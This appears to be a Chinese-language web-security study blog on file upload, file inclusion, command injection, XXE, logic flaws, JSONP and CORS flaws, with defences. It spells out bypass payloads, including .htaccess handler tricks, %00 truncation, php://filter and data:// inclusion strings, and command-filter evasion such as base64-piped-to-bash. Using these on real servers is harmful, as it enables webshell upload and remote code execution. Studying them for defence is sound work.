<h2 id="文件上传"><a href="#文件上传" class="headerlink" title="文件上传"></a>文件上传</h2><p><strong>一、概述</strong><br>产生原因：由于程序员未对上传的文件进行严格的验证和过滤<br>危害：用户可以（越过其本身权限）向服务器上上传可执行的脚本文件，从而getshell。<br><strong>二、常见校验上传文件的方法、分类</strong></p>
<ol>
<li><strong>前端JS校验</strong><br>概述：通过javascript代码来验证上传文件的后缀适合合法，在前端验证，还没有发送数据包。<br>绕过：删除前端页面上的该段js验证代码</li>
<li><strong>服务端校验请求头 content-type字段</strong><br>概述：发送数据包，判断请求头中的content-type字段是否合法：<code>image/gif</code>、<code>image/png</code>、<code>image/jpeg</code><br>绕过：MIME绕过，上传PHP文件，抓包修改content-type字段为合法类型</li>
<li><strong>文件头检测</strong><br>概述：检测所上传的文件是否符合允许格式的范围<br>绕过：在恶意文件的开头加入合法文件格式的文件头，如GIF-47 49 46 38 39 61（二进制，GIF98a）</li>
<li><strong>黑名单，白名单校验</strong></li>
<li><strong>自定义WAF校验</strong></li>
</ol>
<p><strong>三、常见绕过方法</strong></p>
<ol>
<li>文件幻数（文件头）检测绕过：如果检测机制要检测上传的文件是否为图片，而攻击者上传的文件不是图片，则在木马内容的前面插入对应的文件头内容，例如：JFIF(jpg图片)、GIF89a (gif文件)，PNG(png图片)</li>
<li>大小写，双写绕过</li>
<li>黑名单绕过：改为黑名单里面没有的后缀，如php3、html</li>
<li><code>.htaccess</code>上传绕过：</li>
</ol>
<ul>
<li>htaccess文件是Apache服务器中的一个配置文件，它负责相关目录下的网页配置。通过htaccess文件，可以帮我们实现：网页301重定向、自定义404错误页改变文件扩展名、允许&#x2F;阻止特定的用户或者目录的访问、禁止目录列表、配置默认文档等功能。</li>
<li>文件内容如：<code>SetHandler application/x-httpd-php</code>意思是设置当前目录所有文件都使用PHP解析，就可直接上传图片马</li>
</ul>
<ol start="5">
<li>空格绕过：抓包，在文件后缀php的后面加许多空格；验证机制不会自动去除空格，会认为是一个整体，则与<code>php</code>不匹配，即可绕过验证；而Windows系统下文件名中的空格会当作空处理，任然当作是php文件执行。</li>
<li><code>.</code>号绕过：抓包在文件后缀名后面加<code>.</code>号<code>php.</code>，验证机制不会匹配，而windows系统下会去掉最后一个点号</li>
<li>特殊符号绕过：文件名改为如<code>test.php::$DATA</code>，验证机制无法匹配，而在服务器上生成的是<code>test.php</code>文件</li>
<li>路径组合绕过：根据验证机制一点点修改后缀，如去掉点、空格、转换大小写之类的</li>
<li>%00截断：</li>
</ol>
<ul>
<li>条件：magic_quotes_gpc&#x3D;off，php版本&lt;5.3.4</li>
<li>绕过原理：php内核由c语言实现，因此使用了c语言中的字符串处理函数，在连接字符串时0字节作为 字符串的结束字符，%00url解码为0x00，magic_quotes_gpc开启时会将%00转义为\0两个单体字符，故不具备截断功能。</li>
<li>GET型：抓包，在文件后缀后面添加<code>%00</code></li>
<li>POST型：bp抓包，进入hex，将后缀<code>php</code>后面的十六进制改为<code>00</code>(可先添加空格<code>20</code>，以便定位)</li>
</ul>
<ol start="10">
<li>上传图片马绕过：需要结合文件包含漏洞进行利用（copy a.jpg&#x2F;b + b.php&#x2F;a c.jpg）</li>
<li>二次渲染：</li>
</ol>
<ul>
<li>原理：文件上传成功后，如果有经过二次渲染处理的话（所谓二次渲染就是重新在生成一次图片），容易把图片马中的PHP代码修改掉。</li>
<li>把php代码放在图片经过二次渲染不会被修改的位置（不同图片修改的位置不一样）</li>
</ul>
<ol start="12">
<li>条件竞争：先将文件上传到服务器，服务器会判断文件后缀是否合法，如果合法则根据规则进行重命名等操作，不合法则删除，因此可以上传php文件，只需要<strong>在它删除之前访问</strong>即可，可以利用burp的intruder模块不断上传，然后不断的访问刷新该地址即可； 目的就是在文件还存在时执行一段php代码，比如新建一个文件，写入一句话。</li>
</ol>
<p><strong>常用上传函数：</strong></p>
<ol>
<li><code>move_uploaded_file(file,newloc)</code>：将上传的文件放到指定位置，若成功则返回true  否则false。</li>
</ol>
<h3 id="文件上传防御方法"><a href="#文件上传防御方法" class="headerlink" title="文件上传防御方法"></a>文件上传防御方法</h3><ol>
<li>文件扩展名服务端白名单校验</li>
<li>文件内容服务端校验</li>
<li>上传文件重命名</li>
<li>隐藏上传文件路径</li>
<li>文件上传的目录设置为不可执行</li>
<li>单独设置文件服务器的域名</li>
<li>使用安全设备防御</li>
<li>根据业务需要限制文件大小</li>
</ol>
<p><strong>文件后缀绕过的原理</strong><br>在Apache的解析顺序中，是从右到左开始解析文佳后缀的，如果最右侧的扩展名不可识别，就继续往左判断，知道遇到可以解析的文件后缀为止。例如：1.php.xxx</p>
<h2 id="文件包含"><a href="#文件包含" class="headerlink" title="文件包含"></a>文件包含</h2><p><strong>一、概述</strong><br>漏洞产生原因：文件包含函数加载的参数没有经过过滤或严格定义，可以被用户控制，包含其他恶意文件，导致了执行非预期代码。<br>常见文件包含函数：</p>
<ul>
<li>require()        &#x2F;&#x2F;函数出现错误时，会直接报错并退出程序执行;</li>
<li>include()        &#x2F;&#x2F;函数出现报错时，会抛出一个警告，程序继续执行;</li>
<li>require_ once()        &#x2F;&#x2F;同require()， 但仅包含一次。在脚本执行期间同个文件可能被多次引用，确保只包含一次以避免函数重定义、变量重新赋值等问题。</li>
<li>include_ once()        &#x2F;&#x2F;同include()，但仅包含一次。</li>
</ul>
<p><strong>二、文件包含的类型</strong><br><strong>本地文件包含：</strong></p>
<ol>
<li>概述：被包含的文件在本地；包含文件的内容只要符合php语法都能被当成php代码进行解析，无关后缀名是什么；若文件内容不符合PHP语法规范则会暴漏其源码。包含不存在的文件则可能暴露路径。</li>
<li>利用方式：</li>
</ol>
<ul>
<li>包含本地敏感文件、上传文件</li>
<li>包含日志文件</li>
<li>包含session文件</li>
</ul>
<p><img src="/./images/1647240590431.png" alt="enter description here">[include-2]<br><strong>远程文件包含</strong></p>
<ol>
<li>概述：被包含的文件在远程服务器</li>
<li>条件：远程文件包含需将php. ini中设置allow_ur_ fopen &#x3D; On (默认)、allow_url_include &#x3D; On (php5.2后默认为off,需手动设置)。</li>
<li>利用方式：包含攻击者指定的远程url文件，如远程包含shell</li>
</ol>
<h3 id="php伪协议"><a href="#php伪协议" class="headerlink" title="php伪协议"></a>php伪协议</h3><p><strong>php:&#x2F;&#x2F;filter 设计用来过滤筛选文件</strong></p>
<ol>
<li>概述：主要用来查看源码。直接包含php文件时会被解析，不能看到源码，所以用filter来读取敏感文件，但是需要进行base64加密传输。</li>
<li>php:&#x2F;&#x2F;filter参数：</li>
</ol>
<ul>
<li>resource&#x3D;&lt;要过滤的数据流&gt;        &#x2F;&#x2F;这个参数时必须的，它指定了你要筛选过滤的数据流。</li>
<li>read&#x3D;&lt;读链的筛选列表&gt;              &#x2F;&#x2F;该参数可选，可以设定一个或多个过滤器名称，以管道符（&#x2F;）分隔。</li>
<li>write&#x3D;&lt;写链的筛选列表&gt;               &#x2F;&#x2F;该参数可选，可以设定一个或多个过滤器名称，以管道符（&#x2F;）分隔。</li>
<li>&lt;；两个链的筛选列表&gt;                  &#x2F;&#x2F;任何没有以read&#x3D;或write&#x3D;作前缀的筛选器列表会视情况应用于读或写链。</li>
</ul>
<ol start="3">
<li>常见的过滤器：</li>
</ol>
<ul>
<li>字符串过滤器<br>string.rot13 &#x2F;&#x2F;进行rot13转换<br>string.toupper &#x2F;&#x2F;将字符全部大写<br>string.tolower &#x2F;&#x2F;将字符全部小写<br>string.strip_tags &#x2F;&#x2F;去除空字符、HTML和PHP标记后的结果</li>
<li>转换过滤器<br>convert.base64-encode &#x2F;&#x2F;base64编码<br>convert.base64-decode &#x2F;&#x2F;base64解码<br>convert.quoted-printable-encode quoted-printable &#x2F;&#x2F;编码（也是另一种将二进制进行编码的方案）<br>convert.quoted-printable-decode quoted-printable &#x2F;&#x2F;解码<br>convert.iconv &#x2F;&#x2F;实现任意两种编码之间的转换</li>
<li>压缩过滤器<br>zlib.deflate &#x2F;&#x2F;压缩过滤器<br>zlib.inflate &#x2F;&#x2F;解压过滤器<br>bzip2.compress &#x2F;&#x2F;压缩过滤器<br>bzip2.decompress &#x2F;&#x2F;解压过滤器</li>
<li>加密过滤器<br>mcrypt.* &#x2F;&#x2F;加密过滤器<br>mdecrypt.* &#x2F;&#x2F;解密过滤器</li>
</ul>
<ol start="4">
<li>payload示例：<code>?page=php://filter/convert.base64-encode/resource=include.php</code></li>
<li>文件前面有<code>&lt;?php exit; ?&gt;</code>：</li>
</ol>
<ul>
<li>绕过方法一：利用<code>php://filter</code>协议，进行base64解码读取。<br> 注释：base64编码中只包含64个可打印字符（大小写字母，0-9，+，&#x2F;），而PHP在解码base64时，遇到不在其中的字符时（如&lt;、?、&gt;、；），将会跳过这些字符，仅将合法字符每三个组成一个新的字符串进行解码。<br>  <img src="/./images/1626166327297.png" alt="enter description here">[include-1]</li>
<li>绕过方法二：<br> php:&#x2F;&#x2F;filter允许使用多个过滤器，先将<?php phpinfo(); ?>进行base64编码，用string.strip_tags将<?php exit; ?>这段代码过滤掉，再将webshell用base64解码还原。（去除空字符、HTML和PHP标记后的结果）</li>
</ul>
<p><strong>php:&#x2F;&#x2F;input</strong></p>
<ol>
<li>概述：主要用来接收post数据，将post请求中的数据作为php代码执行。需要设置<code>allow_url_fopen=0ff</code> <code>allow_url_include=On</code>，但<code>enctype=multipart/form-data</code> 的时候<code>php://input</code>是无效的。</li>
<li><code>php://input</code>添加在url中</li>
</ol>
<p><strong>zip:&#x2F;&#x2F;、bzip2:&#x2F;&#x2F;、zlib:&#x2F;&#x2F;协议</strong></p>
<ol>
<li>概述：都属于压缩流，可以访问压缩文件中的子文件。</li>
</ol>
<p><strong>phar:&#x2F;&#x2F;协议</strong><br>相当于执行包含文件内容</p>
<ol>
<li>格式：<code>phar://[压缩文件绝对/相对路径]/[压缩文件内的子文件名]</code></li>
<li>示例：构造URL<code>?page=phar://../../hackable/uploads/cmd.rar/cmd.txt</code>包含该压缩包中的文件</li>
</ol>
<p><strong>data:&#x2F;&#x2F;协议</strong></p>
<ol>
<li>概述：将原本的include的文件流重定向到了用户可控制的输入流中。需要<code>allow_ur_ fopen = On</code>、<code>allow_url_include = On</code>。</li>
<li>可以直接执行php代码，格式：<code>data:text/plain,&lt;?php执行内容?&gt;</code></li>
<li>如果对特殊字符进行了过滤，可以将代码进行base64编码，<br>格式：<code>data:text/plain;base64,编码后的php代码</code></li>
</ol>
<h3 id="文件包含绕过方式"><a href="#文件包含绕过方式" class="headerlink" title="文件包含绕过方式"></a>文件包含绕过方式</h3><ol>
<li><strong>%00截断</strong></li>
</ol>
<ul>
<li>条件：magic_quotes_gpc&#x3D;off，php版本&lt;5.3.4</li>
<li>在包含的文件后面添一个%00截断，即?file&#x3D;test.txt%00就可成功绕过。</li>
</ul>
<ol start="2">
<li><strong>长路径截断</strong></li>
</ol>
<ul>
<li>条件：php版本&lt;5.2.8</li>
<li>Windows下目录最大长度为256字节，超出部分会被丢弃；Linux下目录最大长度为4096字节，超出部分会被丢弃。</li>
<li>构造url<code>?file=phpinfo.php...................................</code>(足够长)，长度超过规定字节后，网页代码规则自动添加的部分就会成为被丢弃的部分。</li>
</ul>
<ol start="3">
<li><strong>?、#、空格绕过（适用于远程文件包含）</strong></li>
</ol>
<ul>
<li>需设置allow_url_include &#x3D; On，#和空格需要进行url编码。</li>
<li>构造url为<code>?file=http://127.0.0.1/rg/phpinfo.php?</code><br><code>?file=http://127.0.0.1/rg/phpinfo.php%23</code><br><code>?file=http://127.0.0.1/rg/phpinfo.php%20</code>都可以绕过</li>
</ul>
<p><strong>文件包含漏洞的防御方式</strong></p>
<ol>
<li>尽量不使用动态包含，无需要情况下设置<code>allow_url_include</code>和<code>allow_url_fopen</code>为关闭；</li>
<li>对可以包含的文件进行限制：使用白名单的方式，或者设置包含的目录，<code>open_basedir</code>；</li>
<li>严格检查用户输入，参数中不允许出现<code>../</code>之类的目录跳转符；</li>
<li>严格检查变量是否初始化；</li>
<li>不要仅仅在客户端做数据的验证与过滤，关键的过滤步骤在服务端进行。</li>
</ol>
<p><strong>变量覆盖：</strong></p>
<h2 id="命令执行"><a href="#命令执行" class="headerlink" title="命令执行"></a>命令执行</h2><p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/zzjdbk/p/13491028.html">https://www.cnblogs.com/zzjdbk/p/13491028.html</a><br><strong>一、管道符</strong><br><em><strong>Windows：</strong></em><br><code>|</code>直接执行后面的语句，例：<code>ping www.baidu.com | whoami</code>；<br><code>||</code>如果前面的命令是错误的，那么就执行后面的语句，否则只执行前面的语句；<br><code>&amp;</code>前面后后面的命令都要执行，无论前面真假；<br><code>&amp;&amp;</code>如果前面为假，后面的命令也不执行，如果前面为真，则执行两条命令；</p>
<p><em><strong>Linux：</strong></em><br>含有<code>|</code>、<code>||</code>、<code>&amp;</code>、<code>&amp;&amp;</code>、<code>;</code>五种管道符，<code>;</code>作用与<code>&amp;</code>一样。<br><strong>二、空格过滤绕过</strong><br>可使用<code>$&#123;IFS&#125;</code>：cat${IFS}flag.txt，cat${IFS}$1flag.txt，cat$IFS$1flag.txt；<br>重定向符<code>&lt;</code> <code>&gt;</code>：cat&lt;&gt;flag.txt，cat&lt;flag.txt<br><code>%09</code>需要php环境：cat%09&#x2F;root&#x2F;flag<br><strong>三、黑名单绕过</strong></p>
<ul>
<li>拼接：<br>a&#x3D;c;b&#x3D;at;c&#x3D;fl;d-ag;$a$b $c$d.txt</li>
<li>base64编码：<br><code>echo &quot;Y2F0IGZsYWc=&quot;|base64 -d</code><br>echo “Y2F0IGZsYWc&#x3D;”|base64 -d|bash</li>
<li>单引号，双引号：<br>ca””t fla’’g.txt</li>
<li>反斜线：<br>ca\t fl\ag.txt</li>
<li>$1，$2，$@：<br>ca$1t fla$@g.txt</li>
</ul>
<p><strong>四、读文件绕过</strong><br>cat被过滤时：<br>more:一页一页的显示档案内容<br>less:与 more 类似，但是比 more 更好的是，他可以[pg dn][pg up]翻页<br>head:查看头几行<br>tac:从最后一行开始显示，可以看出 tac 是 cat 的反向显示<br>tail:查看尾几行<br>nl：显示的时候，顺便输出行号<br>od:以二进制的方式读取档案内容<br>vi:一种编辑器，这个也可以查看<br>vim:一种编辑器，这个也可以查看<br>sort:可以查看<br>uniq:可以查看<br>file -f:报错出具体内容</p>
<p><strong>五、通配符绕过</strong><br>&#x2F;???&#x2F;?[a][t] ?’’?’’?’’?’’<br>&#x2F;???&#x2F;?at flag<br>&#x2F;???&#x2F;?at ????<br>&#x2F;???&#x2F;?[a]’’[t] ?’’?’’?’’?’’</p>
<p><strong>六、内联绕过执行</strong><br>反引号<code>命令</code>和<code>$(命令)</code>都是执行命令的方式</p>
<p><strong>七、绕过长度限制</strong><br><em><strong>Linux中的&gt;符号和&gt;&gt;符号：</strong></em></p>
<ul>
<li>通过&gt;来创建文件：&gt;flag2.txt；</li>
<li>通过&gt;将命令结果存入文件中：会将原有文件内容覆盖，如果存入不存在的文件名，就会新建文件；</li>
<li><code>&gt;&gt;</code>符号的作用是将字符串添加到文件内容末尾，不会覆盖原内容</li>
</ul>
<p><em><strong>Linux中命令换行：</strong></em><br>在Linux中，当我们执行文件中的命令的时候，我们通过在没有写完的命令后面加<code>\</code>，可以将一条命令写在多行；<br><img src="/./images/1640095611783.png" alt="enter description here">[rce-1]</p>
<p>所以可以在限制长度的情况下执行命令，将命令一条一条输入一个文本中再执行；<br><img src="/./images/1640095783288.png" alt="enter description here">[rce-2]</p>
<p><em><strong>利用ls -t和&gt;以及换行符绕过长度限制执行命令(文件构造绕过)：</strong></em><br>在Linux中，使用ls -t命令后，可以将文件名按照时间顺序排列出来(后创建的在前面)</p>
<p><strong>八、代码分析</strong><br>当命令执行函数的参数是由外部传入时，对传入的命令没有进行过滤和检测，导致可以利用管道符执行其他的命令。</p>
<p><strong>九、命令执行常用函数</strong><br>传入命令并返回执行结果：</p>
<ul>
<li>exec()  只返回最后一行的结果</li>
<li>system()  逐行返回数据</li>
<li>shell_ecec()</li>
<li>passthru()  </li>
<li>反引号  实际就是调用shell_exec()<br>不返回执行结果，而是返回一个文件指针</li>
<li>popen()</li>
<li>proc_open()</li>
<li>pcntl_exec()</li>
</ul>
<p><strong>十、命令执行与代码执行的区别</strong><br>  命令执行指可用执行系统或应用指令的漏洞；<br>  代码执行指应用程序本身过滤不严，用户可以通过请求将代码注入到应用中执行；<br>  eval()和assert()函数导致的大多时因为载入缓存或模板以及对变量的处理不严格导致；<br>  preg_replace()函数用来处理字符串，需要存在&#x2F;e参数；<br>  call_user_func()和call_user_func_array()函数的功能时调用函数；<br>  array_map()函数的作用时调用函数并且除第一个参数外其他参数作为数组，通常会固定第一个参数，即调用的函数。</p>
<h2 id="XXE"><a href="#XXE" class="headerlink" title="XXE"></a>XXE</h2><p><strong>XML外部实体注入</strong></p>
<h3 id="XXE漏洞原理"><a href="#XXE漏洞原理" class="headerlink" title="XXE漏洞原理"></a>XXE漏洞原理</h3><p>没有限制XML引入外部实体，当提交一个包含外部实体的XML请求时，外部实体的内容就会执行</p>
<h3 id="修复"><a href="#修复" class="headerlink" title="修复"></a>修复</h3><ol>
<li>禁止使用外部实体</li>
<li>过滤用户提交的XML数据，防止出现非法内容</li>
</ol>
<h2 id="逻辑漏洞"><a href="#逻辑漏洞" class="headerlink" title="逻辑漏洞"></a>逻辑漏洞</h2><p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/X-caiji/p/11209963.html">https://www.cnblogs.com/X-caiji/p/11209963.html</a><br><a target="_blank" rel="noopener" href="https://blog.csdn.net/qqchaozai/article/details/102802018">https://blog.csdn.net/qqchaozai/article/details/102802018</a><br><strong>一、原理</strong><br>逻辑漏洞就是指攻击者利用业务设计缺陷，获取敏感信息或破坏业务完整性。一般出现在密码修改、越权访问、密码找回、交易支付金额等功能处。</p>
<p><strong>二、修复</strong></p>
<ol>
<li>严格验证请求者的身份</li>
<li>登录成功后再次访问，从session中调取用户名密码，而不是由用户传入</li>
</ol>
<p><em><strong>任意修改订单金额</strong></em><br>原理：<br>  后端校验不严格。<br>利用：<br>   在提交订单的时候抓取数据包对数据包的内容进行修改，或者直接修改前端价格处的代码。<br> 预防思路：将订单进行多重校验。<br>   可将下单过程分为提交订单请求和支付请求，当用户发送提交订单请求时，服务端根据商品ID和金额等信息生成一个复杂的哈希值，然后又发送一个支付请求，服务端将支付金额又进行哈希计算，与前一次的哈希值进行匹配，匹配成功则该订单生效；如果在发送支付请求的过程中将订单金额修改了，那么生成的哈希值就与前一次不匹配，则订单不生效。</p>
<p><em><strong>验证码回传</strong></em><br>原理：<br>  用户发送验证码请求后，服务端将验证码发送给用户本地（或者用户邮箱或手机）。<br>利用：<br>  抓取Response数据包，里面就包含了验证码。<br>预防方式：</p>
<ol>
<li>不在Response数据包中存放验证码，将生成的验证码和用户输入的验证码传给服务器，在后端进行匹配，相同则验证成功。缺点：服务器压力增加。</li>
<li>生成验证码后将验证码明文发送给用户手机或邮箱，将加密后的验证码放入到Response包中返回到用户本地，用户输入后，将验证码进行加密，与Response包中加密的验证码进行对比，相同则验证成功。</li>
</ol>
<p><em><strong>越权漏洞</strong></em><br>原理：<br>  在访问一些页面时，对用户的登录信息校验存在缺陷，导致攻击者可以直接访问别人的信息页面等。<br>利用：<br>  观察url的格式特征，例如不同的用户在登录情况下对应url中不同的ID号，或者在url中标明执行的操作，比如<code>action=edit</code>或<code>action=delete</code>之类的。观察到了url具有一定的规则后，就可以尝试是否存在越权漏洞。<br>预防方式：<br>  在用户跳转访问其他页面时，对用户的cookie、ssid、token等身份信息进行验证，验证成功再进行跳转。</p>
<p><em><strong>密码找回存在缺陷</strong></em><br>一、<br>原理：<br>  在找回密码输入验证码后，在返回包中存在一个验证码是否正确的标识位，如果这个标识只在前端进行验证，那么就可以通过修改这个标识位来实现修改任意用户密码。<br>利用：<br>  自己注册一个用户，然后选择找回密码，输入正确验证码后，抓包查看返回包的格式，然后找回别的用户的密码，抓取返回包，按照验证码正确的格式修改返回包。<br>二、<br>  在通过手机验证码找回时，网站向用户手机发送验证码，这个时候如果没有对手机号进行验证验证，就可以通过修改验证码发送到的手机号，这样就获取到了找回其他用户密码的验证码。<br>三、<br>  找回密码的验证码位数很少，并且没有输入错误 次数的限制，就可以对验证码进行爆破。</p>
<h2 id="JSONP跨域漏洞"><a href="#JSONP跨域漏洞" class="headerlink" title="JSONP跨域漏洞"></a>JSONP跨域漏洞</h2><p><a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_39190897/article/details/113769462?utm_medium=distribute.pc_relevant.none-task-blog-2~default~baidujs_baidulandingword~default-0.queryctr&amp;spm=1001.2101.3001.4242.1&amp;utm_relevant_index=3">https://blog.csdn.net/weixin_39190897/article/details/113769462?utm_medium=distribute.pc_relevant.none-task-blog-2~default~baidujs_baidulandingword~default-0.queryctr&amp;spm=1001.2101.3001.4242.1&amp;utm_relevant_index=3</a><br><strong>一、概念</strong><br>  可以让网页从别的域名(网站)获取资料，即跨域读取数据。<br>同源策略：不同域的客户端脚本在没有明确授权的情况下，不能读写对方的资源。<br>  由于同源策略，两个不同源的网站是无法进行沟通的，但是可以使用HTML中的<code>&lt;script&gt;</code>标签引用不同源上的文件，这就是JSONP。用 JSONP 抓到的资料并不是 JSON，而是任意的JavaScript，用 JavaScript 直译器执行而不是用 JSON 解析器解析。<br>  类似于钓鱼<br>  JSONP是基于JSON格式的为解决跨域请求资源而产生的解决方案。<br><em><strong>跨域原理：</strong></em><br>  JSONP 实现的基本原理是利用了 HTML 里<code> &lt;script&gt;&lt;/script&gt;</code>元素标签，远程调用 JSON 文件来实现数据传递。</p>
<p>  使用<code>&lt;script&gt;</code>标签，将里面的 src 属性设置为要请求的地址：<br>  <code>&lt;script src=&quot;http::localhost:8081/test.php&quot;/&gt;</code><br>  <code>&lt;script&gt;</code>标签会自动解析并执行返回的内容，如果这些内容不是完整的 JavaScript 代码，程序就会报错，所以在进行 JSONP 跨域请求时，需要保证服务器返回一段完整的 JavaScript 代码；<br>  但是也不能只返回纯 JSON 数据，因为 JSON 数据会自动转换为一个 JavaScript 对象，如果不将其分配给变量或传递给函数，就无法使用；<br>  那么，在请求中定义一个回调函数（被作为参数传递的函数），服务器接收这个回调函数，并将要返回的 JSON 数据作为函数的参数一同返回，这样<code>&lt;script&gt;</code>标签在解析并执行返回内容时就会自动调用这个函数；（服务器返会的内容必须是一段可执行的 JavaScript 代码）<br>  <code>&lt;script src=&quot;http::localhost:8081/test.php?callback=getCookie&quot;/&gt;</code></p>
<p><strong>二、作用</strong><br><em><strong>导致XSS：</strong></em><br>  在JSNOP跨域中我们可以传入一个自定义函数名参数，服务端就会动态生成对应的JSNOP数据，这个时候如果对传入的参数处理不当，如未正确设置响应包的Content-Type、未对用户输入参数进行有效过滤或转义时，就会导致XSS漏洞的产生。</p>
<p><em><strong>防御：</strong></em><br>设置<code>Content-type: application/json</code>，这样浏览器不会将恶意插入的xss代码当作html文档来解析，而是将其是为JSON数据来解析，从而起到防御作用。</p>
<h3 id="JSONP劫持"><a href="#JSONP劫持" class="headerlink" title="JSONP劫持"></a>JSONP劫持</h3><p>当某网站通过 JSONP 的方式来跨域（一般为子域）传递用户认证后的敏感信息时，攻击者可以构造恶意的 JSONP 调用页面，诱导被攻击者访问来达到截取用户敏感信息的目的。<br><img src="/./images/1640886106872.png" alt="enter description here">[jsonp-1]</p>
<p><strong>JSONP劫持用户信息</strong><br>用户登录目标网站后，访问了含恶意网站（该网站含有回调函数和向目标网站发送请求的代码），用户就会向目标发展发送请求，返回<br><strong>JSONP劫持防护方法：</strong><br>1、严格安全的实现 CSRF 方式调用 JSON 文件：限制 Referer 、部署一次性 Token 等。<br>2、严格安装 JSON 格式标准输出 Content-Type 及编码（ Content-Type : application&#x2F;json; charset&#x3D;utf-8 ）。<br>3、严格过滤 callback 函数名及 JSON 里数据的输出。<br>4、严格限制对 JSONP 输出 callback 函数名的长度(如防御上面 flash 输出的方法)。<br>5、其他一些比较“猥琐”的方法：如在 Callback 输出之前加入其他字符(如：<code>/**/</code>、回车换行)这样不影响 JSON 文件加载，又能一定程度预防其他文件格式的输出。还比如 Gmail 早起使用 AJAX 的方式获取 JSON ，听过在输出 JSON 之前加入 while(1) ;这样的代码来防止 JS 远程调用。</p>
<h2 id="CORS"><a href="#CORS" class="headerlink" title="CORS"></a>CORS</h2><p><strong>一、概述</strong><br>  CORS即跨域资源共享，用于绕过同源策略来实现跨域资源访问的一种技术。CORS漏洞则是利用CORS技术窃取用户敏感数据。<br>  Web应用程序可以通过在HTTP报文中增加特定字段来告诉浏览器哪些源的服务器可以访问本站。</p>
<p><strong>二、跨域流程</strong><br>分为<code>简单请求</code>和<code>非简单请求</code>。<br>简单请求同时满足：</p>
<ul>
<li>请求方式是HEAD,GET,POST三种之一</li>
<li>HTTP头的信息只有Accept，Accept-Language，Content-Language，Lat-Event-ID，Content-Type这几个字段</li>
</ul>
<p> <em><strong>简单请求的流程：</strong></em><br>  发起请求后，浏览器发现这是一次简单请求，然后在HTTP头中增加一个<code>Origin</code>字段，标明这次的请求来自哪个域。服务器接收请求后判断<code>Origin</code>字段的域是否在允许请求的范围内，如果在允许范围内，服务器会在响应包中增加三个与CORF相关的字段：</p>
<ol>
<li><code>Access-Control-Allow-Origin</code>：该字段是必须存在的，它的值可以是 Origin 字段的值，也可以是一个通配符<code>*</code>，表示可以接受任意域名的请求，大部分服务器如果配置了通配符的话，信息泄露的风险骤然加大；</li>
<li><code>Access-Control-Allow-Credentials</code>：字段不是必选字段，它的值只能设置为 true，表示服务器允许浏览器将 cookie 包含在请求中，否则就不添加此字段。需要注意的是，如果要发送 cookie，Access-Control-Allow-Origin 就不能设为星号，必须明确指定与请求网页一致的域名(同时Cookie依然遵循同源策略)。</li>
<li><code>Access-Control-Expose-Headers</code>：该字段主要是指定想要获取 <code>XMLHttpRequest</code>对象中<code>getResponseHeader()</code>方法的其他服务器字段。<br><img src="/./images/1645448463397.png" alt="enter description here">[cors-1]</li>
</ol>
<p><em><strong>非简单请求的流程：</strong></em><br>  非简单请求会对浏览器提出特殊要求的请求，请求方式为PUT或DELETE等。<br>  非简单请求会在正式通信前增加一个HTTP查询请求（称之为“预检请求”），（预检包的请求头是 OPTIONS，并携带三个关键字段：Origin(来源)、Access-Control-Request-Method(请求方法)、Access-Control-Request-Headers(请求额外发送的字段)）。<br>  当浏览器收到非简单请求后会先询问服务器，当前网页所在的域是否在允许请求服务器的名单内，以及可以使用哪些HTT字段等，只有收到了肯定的响应，浏览器才会正式发出通信请求，并且设置以后对该服务器的请求都使用简单请求。<br>  服务器否定了预检请求的话会生成不包含CORS相关信息的HTTP回应，拒绝跨域请求；肯定了预检请求的话就会生成一个包含CORS相关信息的HTTP回应，允许跨域请求。<br>  (这样做的好处是给没有使用CORS的服务器减小压力，给了服务器一个提前拒绝的机会。)<br> <img src="/./images/1645449660785.png" alt="enter description here">[cors-2]</p>
<h3 id="CORS漏洞"><a href="#CORS漏洞" class="headerlink" title="CORS漏洞"></a>CORS漏洞</h3><p> 原因：<br>   服务端配置不当，设置了<code>Access-Control-Allow-Origin: *</code>，允许任意域请求，那同源策略就成了摆设，反而增加了风险。</p>
<p><strong>一、如何检测CORS跨域漏洞</strong><br>使用burp在请求包中加上<code>Origin</code>字段，访问我们认为可能有漏洞的网站，查看响应包中是否含有CORS相关的字段，如果返回：</p>
<ol>
<li>实锤存在： 有且仅有如下请求头<br>   <code>Access-Control-Allow-Origin: *</code></li>
<li>实锤存在：同时存在如下两个请求头<br>   <code>Access-Control-Allow-Origin: https://attacker.com</code><br>   <code>Access-Control-Allow-Credentials: true</code></li>
<li>可能存在：同时存在如下两个请求头<br>   <code>Access-Control-Allow-Origin: null</code><br>   <code>Access-Control-Allow-Credentials: true</code></li>
<li>一定不存在：（浏览器会自动阻止）<br>   <code>Access-Control-Allow-Origin: *</code><br>   <code>Access-Control-Allow-Credentials: true</code></li>
</ol>
<p><strong>二、结合XSS</strong><br>如果CORS配置了信任自身的任意子域，那么当一个子域存在XSS漏洞时，就可以通过这个漏洞去读取其他子域的资源。</p>
<p><strong>三、防护方案</strong></p>
<ol>
<li>关闭不必要开启的CORS。</li>
<li>利用白名单来限制能够获取资源的域。（不要将<code>Access-Control-Allow-Origin</code>设置为<code>*</code>或NULL，严格校验来自请求数据包中的Origin的值）</li>
<li>只有在接收到跨域请求时才配置有关于跨域的头部，并且要确保跨域请求是合法的源，以减少攻击者恶意利用的可能性。<br>(4. 仅允许使用安全协议，避免中间人攻击；</li>
<li>尽可能的返回 Vary: Origin 头部，以避免攻击者利用浏览器缓存进行攻击；</li>
<li>避免将 Access-Control-Allow-Credentials 标头设置为默认值 true ，跨域请求若不存在必要的凭证数据，则根据实际情况将其设置为 false；</li>
<li>限制跨域请求允许的方法，Access-Control-Allow-Methods 最大限度地减少所涉及的方法，降低风险；</li>
<li>限制浏览器缓存期限：建议通过 Access-Control-Allow-Methods 和 Access-Control-Allow-Headers 头部，限制浏览器缓存信息的时间。通过配置 Access-Control-Max-Age 标头来完成，该头部接收时间数作为输入，该数字是浏览器保存缓存的时间。配置相对较低的值，确保浏览器在短时间内可以更新策略；）</li>
</ol>
<h2 id="渗透测试工具"><a href="#渗透测试工具" class="headerlink" title="渗透测试工具"></a>渗透测试工具</h2><p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/Iamyoyodan/p/12539665.html">https://www.cnblogs.com/Iamyoyodan/p/12539665.html</a><br>收集域名信息，子域名，对应的IP，whois信息，ICP备案查询，微信公众号，移动APP，旁站，C段，开放端口，敏感接口，目录扫描</p>
